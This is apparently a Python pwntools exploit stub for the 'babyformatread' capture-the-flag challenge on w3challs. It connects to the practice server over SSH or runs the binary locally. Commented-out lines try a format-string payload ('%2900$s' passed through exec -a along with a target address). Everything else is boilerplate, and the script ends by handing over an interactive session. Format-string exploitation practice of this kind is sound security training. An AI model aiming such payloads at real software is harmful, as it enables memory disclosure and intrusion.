#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('babyformatread')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return ssh("basic9", "pwn.w3challs.com", 10101, "basic9", *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

send_arg = "a"#'ciao '*5000

#(exec -a '%2900$s' ./basic9 $(echo -n -e "\x60\xa0\x04\x08") $(python2 -c "print('\x60\xa0\x04\x08 '*1000)")) un po' di tentativi
#io.sendline(f'''(exec -a "%x" ./basic9 $(echo -n -e "\x60\xa0\x04\x08") {send_arg})''')
io.interactive()
